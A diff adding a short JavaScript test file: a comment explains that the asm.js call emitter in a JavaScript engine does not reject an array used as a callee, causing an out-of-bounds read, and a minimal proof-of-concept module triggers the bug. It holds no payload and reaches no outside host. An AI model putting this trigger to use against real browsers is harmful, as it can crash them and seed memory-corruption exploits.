@@ -1,0 +1,21 @@
+/*
+AsmJSByteCodeGenerator::EmitCall which is used to emit call insturctions doesn't check if an array identifier is used as callee. The method handles those invalid calls in the same way it handles valid calls such as "arr[idx & ...]()". In these cases, the index register remains NoRegister which is (uint32_t)-1. It results in OOB read.
+
+PoC:
+*/
+
+function Module() {
+    'use asm';
+    function f() {
+        arr();
+    }
+
+    function g() {
+    }
+
+    var arr = [g];
+    return f;
+}
+
+let f = Module();
+f();
